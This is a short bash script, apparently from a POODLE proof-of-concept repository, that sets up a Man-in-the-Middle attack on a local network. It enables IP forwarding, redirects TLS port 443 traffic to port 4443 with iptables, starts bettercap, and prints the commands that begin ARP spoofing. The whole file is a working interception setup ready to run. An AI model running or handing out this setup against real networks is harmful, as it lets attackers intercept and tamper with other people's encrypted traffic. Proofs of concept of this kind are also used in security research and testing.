#!/bin/bash

# A simple Man-in-the-Middle attack starter script.
# @author: RootDev4 (c) 09/2020
# @url: https://github.com/RootDev4/poodle-PoC

echo 1 > /proc/sys/net/ipv4/ip_forward
echo "[>] Enabled IP forwarding"
iptables -i eth0 -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 4443
echo "[>] Enabled port redirecting from 443 to 4443 on interface eth0"
echo "[>] Starting bettercap on interface eth0"
echo "[>] In bettercap, type 'set arp.spoof.internal true' and 'arp.spoof on' to start the attack"
echo ""

bettercap -iface eth0
